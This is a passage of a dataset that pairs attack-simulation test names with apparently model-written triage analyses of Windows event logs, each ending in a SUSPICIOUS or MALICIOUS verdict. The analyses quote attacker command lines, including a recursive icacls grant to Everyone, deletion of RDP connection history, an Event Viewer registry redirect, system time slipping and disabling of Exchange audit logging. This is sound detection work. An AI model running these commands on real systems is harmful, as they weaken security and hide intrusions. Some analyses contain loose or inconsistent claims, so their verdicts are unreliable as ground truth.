- **General Observations**: The repeated execution of `cmd.exe` to create and execute a file with a different name (`lsm.exe`) suggests a potentially malicious activity aimed at obfuscating actions.

### System Log Analysis:
The update logs pertain to legitimate system updates for Microsoft Defender Antivirus, reflecting regular update activity, which is benign.

### Application and PowerShell Log:
No entries were provided for these logs, hence no observations can be made.

### Assessment and Resolution
Given the events around the re-creation of `cmd.exe` as `lsm.exe` and its execution, there's a strong indication of `SUSPICIOUS` activity that warrants further investigation. This action fits a profile of script or malware attempting to execute under the radar. However, without confirmed malicious payload or further compromising activity observed directly, the activity cannot be definitively classified as `MALICIOUS`.

**Resolution: SUSPICIOUS**

### Guidance on How to Proceed:
1. **Immediate Mitigation**: Isolate the affected system (`Server002`) for a more thorough investigation to prevent potential lateral movement.

2. **Further Investigation**:
   - Conduct a full antivirus and anti-malware scan on `Server002`.
   - Investigate the network and peer systems for similar or related activity, potentially indicating lateral movement patterns.
   - Analyze other correlated activity around the same timeframe or involving similar obfuscation patterns.
   - Track down the origins of the `cmd.exe` operation to understand its source (scripting, user activity, etc.).

3. **Logging and Alerting**: Enhance logging around process creation with specific alerting on execution or renaming of core OS utilities like `cmd.exe` to catch and monitor such behavior immediately in the future."
Flush Shimcache,"### Detailed Analysis

#### Security Log Analysis
The security log entries provided are Windows Event ID 4616 logs, which indicate the event of changing the system time. The changes in system time are executed by the `svchost.exe` process with the user `NT AUTHORITY\LOCAL SERVICE`. The system times are being adjusted by `svchost.exe`, which is a legitimate system process responsible for hosting services. However, unexpected changes to system time can sometimes indicate attempts to tamper with log timestamps or other system activities to cover tracks. In this case, the responsible user and process seem typical for time synchronization.

#### Sysmon Log Analysis
1. **Process Creation (Event ID 1) and Termination (Event ID 5):**
   - The Sysmon logs include frequent execution of processes like `wevtutil.exe`, `conhost.exe`, `cmd.exe`, `whoami.exe`, `rundll32.exe`, and `MicrosoftEdgeUpdate.exe`. 
   - `wevtutil.exe` and `conhost.exe` paired often: `wevtutil.exe` is a legitimate tool used to manage event logs, and `conhost.exe` is typically associated with console-related tasks.
   - The series of `cmd.exe` and `rundll32.exe` executions with the command `Rundll32.exe apphelp.dll,ShimFlushCache` could indicate some script or task running, although this command in itself isn’t necessarily malicious.
   - The `MicrosoftEdgeUpdate.exe` processes running under `NT AUTHORITY\SYSTEM` with commands reflecting updates are likely legitimate, although the frequency and variety suggest an update process or service configuration change.

2. **Notable Observations:**
   - The usage of `whoami.exe` suggests a check of the user's current permissions, which might indicate an attempt to verify privilege escalation.
   - `cmd.exe` invoking `Rundll32.exe`: While `cmd.exe` by itself isn’t suspicious, utilities around DLLs can sometimes be used in creative ways by malware to execute scripts, although the commands shown remain benign in this instance.

#### System Log Analysis
The `Microsoft-Windows-Kernel-General` log entries indicate system time synchronization conducted by `svchost.exe`, which mirrors the security logs' findings regarding time changes. These are generally routine and do not immediately imply malicious activity.

#### Application Log Analysis
The application logs show `edgeupdate` service stop events. Here, the pattern reflects system operations involving Microsoft Edge updates, aligning with logs in the Sysmon channel about `MicrosoftEdgeUpdate.exe`.

### Assessment of the Situation

The log entries show various activities that include system maintenance actions such as system time synchronization, process executions related to log management (`wevtutil.exe`), and potential user or automated script behaviors (`whoami.exe`, `Rundll32.exe`). Despite somewhat frequent time changes and the appearance of various system processes, no clear malicious indicator like unusual file paths, suspicious command lines, or unknown hash values are noted in the logs.

### Identified Threats or Risks

1. **Potential Time Tampering:** Adjustments in time may indicate attempts to alter or manipulate timestamps.
2. **Script or Task Executions:** Executions involving `cmd.exe` and `Rundll32.exe` warrant attention, though the commands don't show clear malicious intent in this case.

### Guidance to Proceed

- **Deep-Dive Analysis:** Ensure these activities, especially those involving system time changes, align with expected system updates or administrative tasks.
- **Alert if Unconfirmed Activity Continues:** Monitor for continued anomalous behaviors or the introduction of new suspicious activity.

### Final Resolution: **SUSPICIOUS**

The activity does not confirm malicious intent but contains elements like frequent system time changes and suspicious commands that require further investigation into purpose and legitimacy. Further scrutiny of associated processes and any scripts or tasks initiated by these users or on these systems is prudent, particularly verifying the administrative context and need for these actions."
Terminal Server Client Connection History Cleared,"Upon analyzing the provided Windows event logs, here are the key points that stand out:

1. **PowerShell Execution**: There are logs indicating `powershell.exe` execution by the user `SERVER002\\admin_test`. PowerShell is often used in automation scripts and administrative tasks but is also frequently leveraged by attackers to execute scripts for malicious actions.

2. **Registry Changes**: There are `cmd.exe` executions that involve registry modifications (`reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"" /va /f` and similar commands). This can indicate attempts to clear recent RDP session information, which is a tactic used by attackers to cover their tracks.

3. **Rapid Process Execution**: A rapid sequence of process executions were observed with `wevtutil.exe`, `conhost.exe`, and other utilities which can be suspicious if they were not initiated by a legitimate administrative task. `wevtutil.exe` is usually used to query or export event log data.

4. **Edge Update Executions**: There are several entries related to `MicrosoftEdgeUpdate.exe` and its components like `MicrosoftEdgeUpdateComRegisterShell64.exe` running under `NT AUTHORITY\SYSTEM`. These processes could be legitimate if they are part of a routine update. However, it's essential to validate the normal update schedule and logs or whether they run as expected without causing service interruptions or anomalous behavior.

5. **Privilege Levels**: Actions are being performed with a `High` integrity level by the user `SERVER002\\admin_test`, indicating administrative privileges, which increases the risk when such activities are performed.

### Assessment
This behavior cannot be immediately classified as definitely malicious without further contextual information. However, there are several indicators such as registry modifications, use of PowerShell, service manipulations, and process creations that suggest these activities may not be entirely benign. The registry deletions, in particular, point toward obfuscation techniques that warrant further investigation.

### Recommendation
Given the potential for misuse:
- Validate the legitimacy of the user actions: Confirm whether the user `admin_test` was performing any IT administration or automation tasks that would justify such actions during that time.
- Correlate these events with other security logs, including network logs, IDS/IPS alerts, and file integrity monitoring checks, to determine if these actions are associated with known malicious indicators.
- Review endpoint configurations for unauthorized changes and inspect system defenses against PowerShell misuse.
- Monitor for any subsequent suspicious behaviors or attempts to escalate privileges across systems.

### Final Resolution
**SUSPICIOUS** - The logs contain activity that doesn't look right and needs more investigation."
Running DLL with .init extension and function,"After analyzing the provided log entries from the Windows event log collection, there are several observations and indicators that merit further attention:

1. **Execution of Suspicious Binary**: The logs indicate execution of a `rundll32.exe` process with the following command line:
   ```
   rundll32.exe C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.011\bin\_WT.init,krnl
   ```
   This is concerning as `rundll32.exe` is a legitimate Windows utility often abused by attackers to execute malicious code. The usage pattern here (from a temporary directory) is unconventional and could be indicative of an attempt to hide malicious activity.

2. **Frequent Use of `conhost.exe` and `wevtutil.exe`**:
   - Multiple instances of `conhost.exe` and `wevtutil.exe` are running. While `conhost.exe` is used frequently and commonly as a part of legitimate process execution, it can also indicate command-line usage related to the suspicious activity.
   - `wevtutil.exe` is legitimate but querying or clearing event logs programmatically can suggest attempts to hide malicious traces.

3. **Sysmon Logs Review**:
   - PowerShell activity is noted at the time of the suspicious `rundll32.exe` execution. This matches with the PowerShell logs that indicate a process triggering PowerShell from a non-standard temp directory path, which can indicate a script-based attack.
   - The execution of `cmd.exe` preceding `rundll32.exe` further raises suspicion of command-line activity that potentially facilitated the malicious actions.

4. **Integrity Level and Execution Context**:
   - The integrity levels for the identified suspicious processes are ""High,"" indicating they may have escalated privileges, which is commonly sought by threat actors post-exploitation.

**Assessment**:
- The use of `rundll32.exe` to execute code from a temporary directory is a notable red flag and aligns with known malicious techniques for fileless malware or other types of attacks.
- The presence and command-line patterns observed with `cmd.exe`, `conhost.exe`, and `wevtutil.exe`, combined with high integrity levels and PowerShell involvement, strongly indicate potentially adverse behavior.

**Resolution**: Given the gathered evidence of suspicious execution patterns, potential evasion attempts, and anomalies in process execution, the logs should be classified as **MALICIOUS**.

**Guidance**:
- Immediate containment measures should be taken on the affected system to prevent further potential damage or lateral movement.
- Conduct deeper forensic analysis on the system to trace the source and impact of the suspected malicious execution.
- Implement enhanced monitoring on the network to detect similar patterns or additional indicators of compromise across other systems.
- Verify the integrity of critical files and clean or recover the affected system to a known good state."
Execution from Compressed JScript File,"### Detailed Analysis of the Logs

#### System Log Analysis:
- The system log shows security intelligence updates for Microsoft Defender Antivirus. These updates are regular system maintenance activities that ensure the antivirus software is up to date with the latest definitions. The logged events (Event IDs 44, 43, 19) indicate the successful application of an update (KB2267602, Version 1.419.626.0) on the machine. This is common, benign behavior.

#### Sysmon Log Analysis:
- **Processes Executed**:
  - Multiple processes initiated by `SERVER002\admin_test` user, with privileged access (High Integrity Level), indicating that this user has administrative rights.
  - `wevtutil.exe` and `conhost.exe` appeared several times, originating from `SERVER002\admin_test`. These utilities can be used legitimately for managing events and console windows but can be scripted in malicious activities.
  - `HOSTNAME.EXE` and `whoami.exe` are used in network and user context verification, which may be part of routine administrative tasks.
  - The `cmd.exe` and `wscript.exe` events are concerning:
    - `cmd.exe` executed a JavaScript file (`datajs.js`) located in a temp directory, which can indicate script execution possibly downloaded or planted, suggesting potential malicious behavior.
    - `wscript.exe` is another script host invocation running the same `datajs.js` script file. Such behavior is typically scrutinized, as it may represent malicious actions like script-based malware execution, pivot or lateral movement.
  - Regular system executable interactions—`calc.exe`, `wuauclt.exe` (part of updating processes), and execution context with ""NT AUTHORITY\SYSTEM"" is seen during Windows updates, marking legitimacy particularly for processes related to security updates.

#### Application Log Analysis:
- Confirmed that Windows Defender is operational with the status marked as `SECURITY_PRODUCT_STATE_ON`.

#### Security Log Analysis:
- A series of 5379 events show unsuccessful attempts in credential operations related to `MicrosoftAccount:user=02txoixylodcstop` determining token or certification failures. This could be part of legitimate account troubleshooting but warrants a deeper look if considered along with suspicious scripts run under elevated contexts.

### Assessment
The Windows Event Logs collectively present an initial picture of what may be daily operational activities; however, the flagged use of `cmd.exe` executing a JavaScript file in a temporary location is notably suspicious. The use of scripting languages in Local or Temp directories by users with elevated privileges could indicate potentially unauthorized script execution. Coupled with the repetitive use of credential checks with return errors, there is cause for deeper scrutiny.

### Conclusion
**Resolution: SUSPICIOUS**

### Guidance on How to Proceed
- **Immediate Actions**:
  - Isolate the machine to prevent any potential spread if the scripts are malicious.
  - Obtain and review the actual content of the `datajs.js` script for analysis.
  - Correlate the execution context of `SERVER002\admin_test` for any unauthorized access or anomalies in logon behavior.
  - Inspect the network activity from this host to check for any unusual outbound connections during the script execution time.

- **Further Recommendations**:
  - Implement tighter controls over script execution policies, limiting the locations and users who can execute scripts, potentially with the use of AppLocker.
  - Regularly audit scripts placed in temporary directories for legitimacy.
  - Increase monitoring of credentials checks and authentications in the environment to catch unusual patterns early.

Pursue more in-depth investigation to verify whether this is a false positive or indicative of early stage compromise, and take active remedial measures accordingly based on findings."
Office 365 - Exchange Audit Log Disabled,"Upon reviewing the provided logs, the following observations regarding suspicious or anomalous behavior have been made:

### Windows PowerShell Log:
1. **PowerShell Execution**: The logs indicate PowerShell activities on `Server002` utilizing a script that involves `$secure_pwd` and `ConvertTo-SecureString -AsPlainText -Force`. The script also connects to `ExchangeOnline` and modifies the audit log configuration using `Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $False`. These kinds of activities can be indicative of an attempt to alter logging capabilities to evade detections and might be associated with credential theft or lateral movement in an environment.

2. **Command Line Concealment**: The presence of `$secure_pwd = """"` and manipulation of `PSCredential` without providing explicit credential data in logs can sometimes camouflage the actual intentions or actions taken, which might be benign or a strategy for covering malicious intent.

### Sysmon Log:
1. **Repeated PowerShell Invocation**: The Sysmon entries log multiple processes launched by `SERVER002\admin_test`, notably involving PowerShell. This correlates with the PowerShell events and further enforces suspicion due to PowerShell's known use in legitimate management and potential misuse for malicious activities.
   
2. **Use of `wevtutil.exe` and `conhost.exe`**: Multiple instances of `wevtutil.exe` and `conhost.exe` being spawned by `admin_test` user which often can be involved in tampering or extracting logs, or being used as shells for more sophisticated behavior.

### Security Log:
1. **Privileged Account Manipulation (Event ID 4672)**: The user `SYSTEM` with the elevated privileges list (`SeAssignPrimaryTokenPrivilege`, `SeDebugPrivilege`, etc.) might indicate an intended or unintended execution of privileged commands on `Server002`, increasing the risk of system integrity breaches.
   
2. **Suspicious Process Activities (Event ID 4798/4799)**: The use of `CompatTelRunner.exe` for accessing credential entries and groups is highly unconventional, might be used to query user and group information possibly for enumeration or privilege escalation activities, though this process is usually benign, this unexpected behavior under administrative credentials could flag an anomaly.

### Assessment:
The combination of suspicious PowerShell scripts, associated Sysmon events, and high-impact Security log entries clearly present behavior that could align with either an insider threat or an external compromise attempting to bypass auditing. Particularly, obfuscating logging activities and handling secure credentials through PowerShell without insight into further context could signal preparatory actions for unauthorized access or data exfiltration.

### Resolution:
**SUSPICIOUS**

**Recommendation**:
- **Immediate Deep Investigation**: Investigate the specific PowerShell script execution context, and assess if any unauthorized users have obtained or misused elevated privileges.
- **Review Exchange Online Logs**: Delve into the Exchange Online access logs to ascertain what operations may have been performed during the `Connect-ExchangeOnline` session.
- **Implement Monitoring and Alerting**: Strengthen the presence of monitoring solutions across the infrastructure, focusing on the detection of abnormal script executions and administrative activities.
- **User Education and Policy Enforcement**: Ensure users, especially those with elevated privileges, are aware of the security policies and possible threats such as phishing or social engineering, to reduce the risk of credentials theft.
- **Patch and Update Protocols**: Continuous evaluation and updating of security patches to reduce the opportunities for exploitation through known vulnerabilities."
Event Log Manipulations- Time slipping via Powershell,"### Detailed Analysis of the Windows Event Logs

#### Anomalous and Suspicious Behaviors Identified:

1. **Time Manipulation using PowerShell:**
   - A series of PowerShell events indicate the execution of a command that adjusts the system date forward by 3 days. The relevant entry in the logs is:
     ```
     Set-Date -Date (Get-Date).AddDays(3)
     ```
   - This command is suspicious as altering the system date/time can be used by malicious actors to bypass time-based security protocols or to manipulate log events.

2. **Usage of `wsmprovhost.exe`:**
   - The Sysmon logs show instances where `wsmprovhost.exe` is the parent process of commands like `whoami.exe` and `hostname.exe`. While `wsmprovhost.exe` is a legitimate component often associated with PowerShell Remoting, its frequent exec of these utilities might indicate lateral movement or discovery activities typical in a compromise scenario.

3. **Consecutive Process Executions:**
   - Several consecutively executed system utilities (`wevtutil.exe`, `conhost.exe`) are seen running under the `admin_test` account, which could indicate unusual activity, especially as they occur almost simultaneously, suggesting automation or scripted tasks.
   - `wevtutil.exe` can be used for reading and writing event log data, which can be used to delete logs as part of cover-up actions in a compromised environment.

4. **High Integrity Level Execution:**
   - Processes like `whoami.exe` and `powershell.exe` are executed under high integrity levels, often indicating administrative privilege usage, which is consistent with actions taken during an attack to gather information or modify settings.

5. **Sysmon Log Events Indicating Potential Manipulation:**
   - Continuous invocation of `MicrosoftEdgeUpdate.exe` processes, possibly indicating persistence or code execution attempts masquerading as legitimate software updates.

6. **Security Log Records:**
   - Multiple unsuccessful access attempts by the `SYSTEM` account to `MicrosoftAccount` credentials, consistently failing with the same error code. This indicates potential unauthorized attempt to access account-related data.

#### Malicious Activity or Compromise Indicators:

- The utilization of PowerShell to adjust system time, combined with the trace of associated processes indicative of reconnaissance or persistence activities, aligns with tactics observed in malicious operations.
- Given the administrative account usage (`admin_test`) for executing these tasks, there is a potential compromise of privileged credentials enabling such actions.

### Assessment of the Situation

- **Threat/Risk Level**: The series of logs suggest activities consistent with unauthorized system manipulation and reconnaissance, posing a security risk through potential privilege escalation or persistence mechanisms.
- **Indicators of Compromise**: System time manipulation via PowerShell and unusual execution patterns of system utilities denote malicious intent or compromise.

### Recommendation and Resolution

- Conduct an immediate security review of the account `admin_test` for suspicious activities and reconsider privileges.
- Investigate the purpose of the PowerShell script altering the system time. Secure and review all other accounts with administrative privileges for unusual activities.
- Examine and monitor network interactions for signs of lateral movement or data exfiltration.
- Consider deploying stricter PowerShell execution policies and general auditing practices to detect similar behaviors moving forward.

**Resolution: MALICIOUS** - The activities observed in the logs point towards a high likelihood of malicious action or a compromised state requiring prompt attention."
Grant Full Access to folder for Everyone - Ryuk Ransomware Style,"**Analysis of Logs:**

**1. Application Log:**
- The 'edgeupdate' service stopped twice in quick succession. Stopping a service is not inherently malicious, but it can be a mark of suspicious activity if observed with other indicators.
- The 'Software Protection Platform Service' logged a regular event, which looks benign.

**2. Sysmon Log:**
- Multiple instances of 'wevtutil.exe' and 'conhost.exe' executing under the user ""SERVER002\\admin_test"" were noted. 
- The use of 'wevtutil.exe' to query event logs can be normal but may also be used maliciously for log clearing or manipulation.
- Commands like 'whoami', 'cmd.exe' invoking 'icacls' to change permissions, and 'conhost.exe' are flagged as potential behavior of interest. 
  - Specifically, the command: `cmd.exe /c icacls ""C:\\Users\\Public\\*"" /grant Everyone:F /T /C /Q`, indicates modification of access permissions recursively in the Public folder. This is a high-risk operation that could be used to propagate malware or provide unauthorized access.
- 'cmd.exe' and 'icacls.exe' use in conjunction with changes to security permissions is suspicious and warrants further investigation.

**3. Security Log:**
- Normal time change events are logged by 'svchost.exe'. These appear to be consistent with time synchronization tasks and don't show signs of tampering.

**4. System Log:**
- Additional time synchronization records from the kernel and time-service are consistent with Network Time Protocol (NTP) operations. These appear normal.

**5. Windows PowerShell Log:**
- There are no entries available in the provided logs, hence further correlation cannot be established from it.

**Assessment of the Situation:**

The logs show typical operations like service starts/stops and system time synchronization, which generally appear benign. However, the Sysmon logs show potentially malicious behavior with the use of 'icacls' to broaden permissions, suggesting an attempt to modify file access rights broadly across the system.

The behavior observed could be indicative of preparatory steps for further actions such as unauthorized data access or lateral movement within the network. Therefore, this requires a more thorough investigation.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
1. **Investigate the User (SERVER002\\admin_test):** Look into recent activities, login records, and any deviations from typical behavior.
2. **Examine 'icacls' Usage:** Determine if the permission modifications were required for legitimate reasons. Check who logged these changes.
3. **Check Network Traffic and Connections:** Monitor outbound connections from this host to ensure no unauthorized data transfer occurs.
4. **Conduct a File Integrity Check:** Confirm integrity on critical and system files to ensure they have not been modified improperly.
5. **Enable Enhanced Logging:** Increase logging levels for deeper insight into activities occurring post these logs to capture evidence of potential compromise. 

Overall, with the 'SUSPICIOUS' rating, it is important to act swiftly and involve the necessary teams to ensure the threat, if present, is contained expediently."
Activate Windows NoTrayContextMenu Group Policy Feature,"Upon reviewing the provided Windows event logs, the following analysis highlights the presence, or lack thereof, of suspicious and potentially malicious activities:

### Analysis:

1. **Sysmon Logs:**
   - **Application Execution:** 
     - There are multiple instances where system utilities like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe` were executed under the user `SERVER002\admin_test`. The frequent use of `cmd.exe` and associated registry modification commands could indicate intended system configuration changes or scripted automation.
     - **Registry Modification:** The usage of `cmd.exe` to conduct registry changes using commands like `reg add` indicates a modification in system policies without explicit mention of user interaction could be suspicious. Specifically, the entry states modifying `NoTrayContextMenu`, which controls menu access using the right-click context.
   - **Process Integrity:** Processes like `cmd.exe` and `reg.exe` were executed at a high integrity level, but since they're legitimate system files, this doesn't inherently signal malicious activity unless the context or origin of execution is suspect.

2. **System Logs:**
   - **Time Synchronization:** Entries regarding time adjustments involving `svchost.exe` are standard system operations and do not inherently point to malicious activities. They reflect routine time synchronization with `time.windows.com`.

3. **Application Logs:**
   - **Edge Update Services:** The presence of entries related to stopping Edge update services is relatively normal, especially with endpoint management operations handling updates at regular intervals.

4. **Security Logs:**
   - **Time Change Auditor Entry**: The presence of entries indicating time changes is logged but does not reflect malicious activity. The changes are conducted by `svcHost.exe` with the authority of `LOCAL SERVICE`.

### Threat and Risk Assessment:
- **Indicators of Compromise:** The logs provide consistent use of system utilities and processes operating at high integrity levels, including command execution for registry modification. However, there is no direct indication of unauthorized access or privilege escalation from the evidence.
- **Suspicious Activity:** Registry modifications, especially changing settings that affect user experience and system policies, are unusual outside of administrative tasks, but in the absence of signs of external command or unique malicious payloads, this remains a point of suspicion rather than confirmation of a breach.

### Conclusion:
The continuous utilization of system utilities and registry modifications could be a result of routine administrative tasks or policies applied by scripts for configuration management. However, specific command-line and registry activities warrant a deeper inspection to rule out possible misuse or unauthorized scripts running under administrative credentials.

### Resolution: **SUSPICIOUS**

**Recommended Actions**:
- Further investigation into the source and context of the registry modifications.
- Verify recent changes or policy updates that might justify these actions.
- Check for any correlating alerts or logs not included which might provide additional context or point to malicious activity (e.g., antivirus logs).
- Conduct a review of scripts and scheduled tasks running on the system for further suspicion validation."

Masquerade as a built-in system executable,"Upon reviewing the provided collection of Windows event logs, there are several points of interest that raise suspicion regarding potential malicious activity:

### Suspicious or Anomalous Behavior:
1. **PowerShell Activities:**
   - There are multiple entries in the PowerShell logs that document the execution of a script which utilizes `Add-Type` to compile and execute a .NET class dynamically. Specifically, a class named ""Test"" is defined and executed with the output directed to create an `svchost.exe` in the `C:\Windows\Temp` directory. This behavior is typical of a process often referred to as ""fileless malware"" or ""living off the land,"" where PowerShell scripts are used to run malicious code without writing anything significant to disk.

2. **Image Execution (Sysmon Logs):**
   - In the Sysmon logs, several instances of process creation involving `wevtutil.exe` and `conhost.exe` are logged, all executed by the user `SERVER002\admin_test`. While these may sometimes be benign, the timing and frequency in these logs, combined with PowerShell activity, may suggest attempts to manipulate event logs or to blend malicious activity into legitimate-looking processes.
   - The log notes the creation of `C:\Windows\Temp\svchost.exe` by a PowerShell process. This is particularly suspicious, as `svchost.exe` is a well-known Windows host process often mimicked by attackers due to its prevalence.

3. **.NET Compiler Executions:**
   - The Sysmon log mentions the execution of `csc.exe` (C# Compiler) from PowerShell, which again aligns with attempts to compile and create executable files dynamically. Combined with a PowerShell script that compiles a class dynamically, this strongly indicates attempts to execute code through unconventional means.

### Indicators of Malicious Activity:
- **Dynamically Compiled and Executed Code:**
  - The creation and execution of `svchost.exe` in the `C:\Windows\Temp` directory that appears to be dynamically compiled from a PowerShell script is highly indicative of potential malicious exploitation. This is not a standard or legitimate pattern of behavior for a benign activity.

- **Signature of Fileless Attack:**
  - Fileless attacks often leverage trusted tools like PowerShell without dropping a significant amount of data on the disk to avoid detection, while trying to maintain persistence.

### Assessment and Final Conclusion:
Given the observations, these logs strongly indicate the presence of potentially malicious activities. The behavior observed is consistent with attack methods aiming to exploit system trust in commonly used executables and the PowerShell environment by leveraging script-based exploits.

**Resolution: MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Action:**
   - Isolate the affected host (Server002) from the network to prevent further potential attack spread or data exfiltration.
   - Investigate the executable `C:\Windows\Temp\svchost.exe` and the related PowerShell scripts being executed for further forensic analysis.

2. **Further Investigation:**
   - Check for additional indicators across other systems within the network for similar PowerShell and process activities.
   - Deep inspect logs and memory for persistence mechanisms or additional backdoors.

3. **Mitigation and Remediation:**
   - Conduct a thorough review and update of security policies that govern the use of PowerShell, including script execution policies.
   - Ensure all systems are patched and up to date, specifically focusing on any security advisories related to PowerShell or .NET.

4. **User Awareness Training:**
   - Emphasize the importance of vigilance among employees, especially those with elevated privileges, like `admin_test` in this instance.

By following these steps, the threat can be contained, understood, and mitigated effectively."
Event Viewer Registry Modification - Redirection Program,"After a detailed analysis of the provided log entries from various Windows event logs, here are the findings and assessment:
 
### Analysis of Logs:

#### Key Observations:
1. **Sysmon Log Entries**:
   - Numerous executions of `wevtutil.exe` and `conhost.exe` by the user `admin_test`. The execution of `wevtutil.exe` is a utility for displaying event logs, which can be legitimate, but frequent use or unexpected surge in such logs may indicate log tampering or exfiltration attempts.
   - Execution of `cmd.exe` with a suspicious command line involving registry modifications:
     ```
     ""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer"" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d ""C:\windows\system32\notepad.exe"" /f
     ```
     This command reroutes the Event Viewer execution to `notepad.exe`, which can indicate an attempt to avoid or manipulate logging.

2. **Security Log Entries**:
   - Multiple logon events (event ID 4624) with privileges assigned to `admin_test`, including `SeDebugPrivilege`, which is concerning as it allows for debugging and potential manipulation of processes.
   - Time discrepancy with logoff (event ID 4634) and logon times, which can be indicative of time tampering (though further evidence is required to confirm).

3. **Application and System Logs**:
   - Time changes evidenced in multiple events (event ID 4616 in Security logs and event ID 1 in System logs). This could indicate potential tampering or time manipulation, often correlated with attempts to hide tracks or synchronize across multiple devices if coordinated attacks are suspected.

### Assessment:
The activities observed in the logs, particularly the registry modifications, execution of `wevtutil.exe`, privileged logons, and time adjustments indicate behavior that is consistent with malicious activity. The modification to reroute the Event Viewer to `notepad.exe` suggests an attempt to hinder detection or forensic analysis. Moreover, the presence of critical privileges and evidence of time manipulation strengthens the indication of a compromise.

### Resolution:
**MALICIOUS**

The logs reflect numerous indicators of compromise, characterized by suspicious command-line executions, registry changes, potential log manipulation attempts, and abnormal frequent use of event viewing and modification utilities.

### Guidance on How to Proceed:
1. **Immediate Response**:
   - Promptly isolate the affected system to prevent further actions by the attacker.
   - Investigate scheduled tasks and services to uncover persistence mechanisms.
   - Review other connected systems for similar activities or indicators of compromise.

2. **Further Investigation**:
   - Conduct a full forensic investigation, including memory dumps and full disk analysis to identify if malware or further unauthorized tools are present.
   - Investigate recent changes and uses of high privilege accounts, especially involving `admin_test`.

3. **Restoration and Mitigation**:
   - Revert any unauthorized registry changes and ensure configurations are set according to security policies.
   - Implement strict monitoring and alerting on administrative actions and privileged access within the network.
   - Educate users on security practices to avoid phishing and encourage vigilance with login activity. 

4. **Report and Documentation**:
   - Document all findings and actions taken for any required compliance and to aid in any legal or disciplinary actions if applicable.
   - Enhance the incident response plan based on learnings to improve future reactions to similar threats."
UACME Bypass Method 34,"Upon examination of the provided Windows event logs, the following observations and analysis can be made:

### Suspicious or Anomalous Behavior:
1. **Execution of Akagi64.exe**: 
   - The Sysmon logs indicate the execution of `Akagi64.exe` from a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script\\34 Akagi64.exe`). This is unusual as executables run from a temporary directory can be indicative of malicious behavior, such as the delivery and execution of payloads in a manner that avoids detection by traditional security mechanisms.

2. **Command Execution Correlations**:
   - There are events showing the execution of `cmd.exe` and `powershell.exe` with command lines that appear to construct paths to arbitrary executable files and attempt to verify their existence. While command shell usage is common, its usage to execute potentially unknown binaries outside of standard application directories is problematic.

3. **Wevtutil.exe Execution**:
   - The logs contain multiple instances of `wevtutil.exe` being executed by the `admin_test` user. This process is used for managing Windows event logs and its unauthorized use by non-administrative processes or users may indicate an attempt to clear or alter event logs to cover tracks.

4. **High Integrity Level Execution**:
   - Processes associated with potential malicious behavior were run at a high integrity level. Elevated privileges during such executions can grant additional dangerous permissions to potentially harmful payloads.

5. **Execution Context**:
   - The processes are being executed under `SERVER002\\admin_test`, an account that appears to be a normal user, but is performing potentially sensitive operations such as executing scripts from strange directories and running `wevtutil.exe`.

6. **Hostile Activity Relative Timing**:
   - The sequence of events, involving `cmd.exe`, `powershell.exe`, and `wevtutil.exe` in rapid succession without typical administrative installations or updates indicates coordination typically found in scripts or malicious activities.

### Indicators of Malicious Activity or Compromise:

- **SHA256 Hash of Executables**:
  - The SHA256 hash of `Akagi64.exe` was `BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0`, which should be checked against threat intelligence databases for any known indicators of compromise (IoCs).

- **Process Indicator**:
  - The presence of code execution from unusual paths: `AppData\\Local\\Temp` is a common location used by malware for lodging and launching executable files.

### Assessment and Recommendations:

Based on the logs reviewed, there are clear indicators that suggest potential malicious activities, particularly focusing on the execution of suspicious executables from non-standard paths that may not align with typical benign Windows operations. Accordingly, additional investigation is warranted to determine the compromise's full scope and nature.

### Resolution: 
- **MALICIOUS**: The presence of unusual executable activity (`Akagi64.exe`), the context of environment setup potentially aiming for privilege escalation or stealth (via `wevtutil`), suggests with high confidence that malicious activities are at play.

### Next Steps:
- **Isolate the Affected System**: Isolate the CEO's machine to prevent potential spread within the network.
- **Immediate Incident Response**: Begin collecting further evidence from endpoints, especially the exact binaries executed and their matches in threat intelligence.
- **IOC Monitoring**: Leverage the SHA256 hash for detection in SIEM, EDR, and establish monitoring for unusual activities on other endpoints.
- **User Awareness and Password Change**: Prompt the involved users, especially `admin_test`, to change their password immediately.

The provided logs demonstrate clear malicious behavior, necessitating immediate action to identify any further signs of compromise and ensure containment and remediation."
Execution of program.exe as service with unquoted service path,"Upon analysis of the provided Windows event logs, the following observations and potential indicators of malicious activity were noted:

### Observations:
1. **Time Change Events (Security Log)**
   - There are several EventID 4616 logs which relate to system time changes. These were executed by the `LOCAL SERVICE` account using `svchost.exe`. While these events could be related to legitimate time synchronization, unauthorized time changes could be a tactic for anti-forensics or to align with a specific attack timeline.

2. **Process Creation and Execution (Sysmon Log)**
   - Numerous processes like `wevtutil.exe`, `cmd.exe`, `conhost.exe`, and `sc.exe` are executed in quick succession by the `admin_test` user. The use of `cmd.exe` for executing multiple commands including `copy` operations and the creation of a new service (`Example Service`) is noted. This is particularly suspicious as it involves:
     - Copying an executable (`WindowsServiceExample.exe`) to system directories (`C:\\Program Files\\windows_service.exe` and `C:\\program.exe`).
     - Creating and starting a new service with `sc.exe`.
   - This indicates behavior commonly used in persistence mechanisms where an attacker installs a malicious service to maintain access or execute malware.

3. **Service Control Manager (System Log)**
   - The logs show creation (EventID 7045) of a new service named ""Example Service"" which is set to auto-start. This aligns with the `cmd.exe` command observed in the Sysmon logs.
   - The subsequent failure (EventID 7000) for starting the service could indicate an incorrect configuration or an intentional bypass to evade detection.

4. **Use of Administrative Tools**
   - Execution of `wevtutil.exe` is observed multiple times by the same user. While it can be used for legitimate log management tasks, it is also known to be used by attackers for clearing event logs.

### Assessment:
- The creation, configuration, and attempted start of the ""Example Service"" alongside the `cmd.exe` operations and numerous process creations/elevations suggest unauthorized actions and potential compromise focused on persistence.

### Conclusion:
- **Resolution**: MALICIOUS
  - The activities observed, including the copying of executables to system directories, service creation, and execution of system commands, indicate typical behavior consistent with malware installation and persistence strategies.
  - The unsuccessful service start might be a result of incomplete configuration or a tactical move to avoid immediate detection.

### Guidance:
1. **Immediate Actions**:
